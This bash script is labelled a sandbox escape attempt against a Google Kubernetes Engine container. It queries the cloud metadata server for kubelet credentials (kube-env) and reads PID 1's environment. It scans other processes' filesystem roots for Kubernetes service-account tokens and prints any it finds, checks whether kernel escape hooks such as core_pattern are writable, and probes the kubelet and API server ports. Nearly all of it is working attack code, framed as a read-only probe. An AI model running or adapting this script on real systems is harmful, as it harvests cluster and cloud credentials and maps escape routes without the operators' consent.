#!/usr/bin/env bash
# Sandbox escape ATTEMPT. Read-only probes only; no sysctl/cgroup writes, no kernel exploits.
set +e
B="YEXTPOC7731"; echo "$B-BEGIN"
MD=http://169.254.169.254/computeMetadata/v1
H='Metadata-Flavor: Google'

echo "$B === A. GKE NODE METADATA ATTRIBUTES (kube-env = kubelet creds) ==="
echo "--- attribute index ---"
curl -s -m 8 -H "$H" "$MD/instance/attributes/" 2>&1 | head -40
for A in kube-env kubeconfig cluster-name cluster-location cluster-uid \
         kubelet-config instance-template created-by; do
  echo "--- attributes/$A ---"
  curl -s -m 8 -H "$H" "$MD/instance/attributes/$A" 2>&1 | head -c 700; echo
done

echo "$B === B. PID NAMESPACE LEAKAGE ==="
echo "pid count: $(ls -d /proc/[0-9]* 2>/dev/null | wc -l)"
ls -d /proc/[0-9]* 2>/dev/null | head -20
echo "--- /proc/1 ---"
cat /proc/1/cmdline 2>&1 | tr '\0' ' '; echo
cat /proc/1/environ 2>&1 | tr '\0' '\n' | head -10
echo "--- can we read ANY other container's SA token via /proc/<pid>/root ? ---"
for P in $(ls -d /proc/[0-9]* 2>/dev/null | head -40); do
  T="$P/root/var/run/secrets/kubernetes.io/serviceaccount/token"
  [ -r "$T" ] && { echo "READABLE: $T"; head -c 120 "$T"; echo; }
done
echo "(end of /proc scan)"

echo "$B === C. MOUNTINFO (host paths) + WRITABILITY ==="
cat /proc/self/mountinfo 2>&1 | head -25
echo "--- /proc/sys and /sys write test (stat only, no write) ---"
for F in /proc/sys/kernel/core_pattern /proc/sysrq-trigger /sys/kernel/uevent_helper; do
  printf '%-40s ' "$F"; [ -w "$F" ] && echo "WRITABLE" || echo "not writable"
done
mount 2>&1 | grep -E 'ro,|rw,' | grep -E '/proc|/sys' | head -6

echo "$B === D. KUBELET / K8S API FROM THE NODE ==="
GW=$(ip route 2>/dev/null | awk '/default/{print $3; exit}')
SELF=$(hostname -i 2>/dev/null)
echo "gateway=$GW self=$SELF"
for T in "$GW:10255/pods" "$GW:10250/pods" "$GW:10250/runningpods/"; do
  printf 'http(s)://%-26s ' "$T"
  curl -sk -m 6 -o - -w ' [HTTP %{http_code}]' "https://$T" 2>&1 | tr -d '\n' | head -c 160; echo
done
printf 'k8s api kubernetes.default   '
curl -sk -m 6 -o - -w ' [HTTP %{http_code}]' https://kubernetes.default.svc/version 2>&1 | tr -d '\n' | head -c 160; echo

echo "$B-END"; exit 0
